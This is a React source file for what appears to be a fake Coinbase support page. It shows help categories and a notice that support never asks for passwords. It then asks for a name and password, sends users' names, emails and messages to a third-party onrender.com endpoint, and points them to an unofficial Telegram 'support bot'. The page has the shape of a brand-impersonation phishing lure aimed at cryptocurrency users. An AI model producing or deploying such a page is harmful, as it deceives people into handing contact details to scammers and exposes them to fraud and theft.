import React, { useState } from "react";
import ReactDOM from "react-dom/client";

function App() {
  const [showLogin, setShowLogin] = useState(false);
  const [loggedIn, setLoggedIn] = useState(false);
  const [name, setName] = useState("");
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [message, setMessage] = useState("");
  const [sent, setSent] = useState(false);
  const [openCategory, setOpenCategory] = useState(null);

  const handleLogin = () => {
    if (name && password) setLoggedIn(true);
  };

  const sendEmail = async () => {
    if (!email || !message) return;
    await fetch("https://coinbase-chat-api.onrender.com/send-support-message", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, email, message })
    });
    setSent(true);
    setTimeout(() => setSent(false), 3000);
    setEmail(""); setMessage("");
  };

  const categories = [
    { title: "Payments", icon: "💳", answer: "Learn how to send, receive, and manage crypto payments on Coinbase." },
    { title: "Account", icon: "👤", answer: "Manage your profile, change your password, or close your account." },
    { title: "Security", icon: "🔒", answer: "Protect your account with 2-step verification and strong passwords." },
    { title: "Verification", icon: "✅", answer: "Complete identity verification to access all features." },
    { title: "Limits & Fees", icon: "📊", answer: "Understand your buying limits and Coinbase’s fee structure." }
  ];

  const toggleCategory = (i) => {
    setOpenCategory(openCategory === i ? null : i);
  };

  return (
    <div style={wrapper}>
      {!showLogin ? (
        <>
          <h1 style={{ fontSize: 32, marginBottom: 10 }}>Find answers to your questions</h1>
          <p style={{ color: "#cbd5e1", marginBottom: 30 }}>Search help topics or browse categories below.</p>

          <div style={catGrid}>
            {categories.map((cat, i) => (
              <div key={i} style={catCard} onClick={() => toggleCategory(i)}>
                <div style={{ fontSize: 32 }}>{cat.icon}</div>
                <div style={{ fontWeight: 600 }}>{cat.title}</div>
                {openCategory === i && (
                  <div style={{ marginTop: 10, color: "#cbd5e1", fontSize: 14 }}>{cat.answer}</div>
                )}
              </div>
            ))}
          </div>

          <div style={policyBox}>
            <h3>Our support team will never ask for your password or 2-step verification codes.</h3>
            <p>We’re here to help you stay safe and secure while using Coinbase.</p>
          </div>

          <button style={buttonStyle} onClick={() => setShowLogin(true)}>Sign in to speak with us</button>
          <button style={chatButton}>💬 Live Chat</button>
        </>
      ) : !loggedIn ? (
        <div style={loginWrapper}>
          <div style={box}>
            <h2>Log in to Support</h2>
            <input style={inputStyle} placeholder="Your name" value={name} onChange={(e) => setName(e.target.value)} />
            <input type="password" style={inputStyle} placeholder="Password" value={password} onChange={(e) => setPassword(e.target.value)} />
            <button style={buttonStyle} onClick={handleLogin}>Log in</button>
          </div>
        </div>
      ) : (
        <div style={box}>
          <h2>Welcome, {name}</h2>
          <a href="https://t.me/coinbasesupportbot" target="_blank" rel="noreferrer" style={linkButton}>
            💬 Contact us via Telegram
          </a>
          <p style={{ marginTop: 30 }}>Or send us a message via email:</p>
          <input style={inputStyle} placeholder="Your email" value={email} onChange={(e) => setEmail(e.target.value)} />
          <textarea rows="4" style={{ ...inputStyle, height: "100px" }} placeholder="Message" value={message} onChange={(e) => setMessage(e.target.value)} />
          <button style={buttonStyle} onClick={sendEmail}>📨 Send Message</button>
          {sent && <p style={{ color: "lightgreen" }}>✅ Message sent!</p>}
        </div>
      )}
    </div>
  );
}

const wrapper = {
  maxWidth: 800,
  margin: "0 auto",
  padding: 20,
  textAlign: "center"
};

const loginWrapper = {
  display: "flex",
  justifyContent: "center",
  alignItems: "center",
  minHeight: "80vh"
};

const catGrid = {
  display: "grid",
  gridTemplateColumns: "repeat(auto-fit, minmax(150px, 1fr))",
  gap: 20,
  marginBottom: 40
};

const catCard = {
  background: "#1e293b",
  padding: 20,
  borderRadius: 10,
  color: "#f1f5f9",
  fontSize: 16,
  cursor: "pointer"
};

const box = {
  background: "#1e293b",
  padding: 30,
  borderRadius: 12,
  textAlign: "center"
};

const policyBox = {
  background: "#0f172a",
  padding: 20,
  borderRadius: 10,
  marginBottom: 40,
  textAlign: "left"
};

const inputStyle = {
  width: "100%",
  padding: "12px",
  borderRadius: "8px",
  backgroundColor: "#0f172a",
  border: "1px solid #334155",
  color: "#f8fafc",
  marginBottom: "10px",
  fontSize: "16px"
};

const buttonStyle = {
  backgroundColor: "#3b82f6",
  color: "#fff",
  padding: "12px 20px",
  border: "none",
  borderRadius: "8px",
  fontSize: "16px",
  cursor: "pointer",
  marginBottom: "20px"
};

const chatButton = {
  ...buttonStyle,
  backgroundColor: "#22c55e"
};

const linkButton = {
  ...buttonStyle,
  display: "block",
  width: "100%",
  marginTop: "20px",
  textDecoration: "none",
  textAlign: "center"
};

ReactDOM.createRoot(document.getElementById("root")).render(<App />);
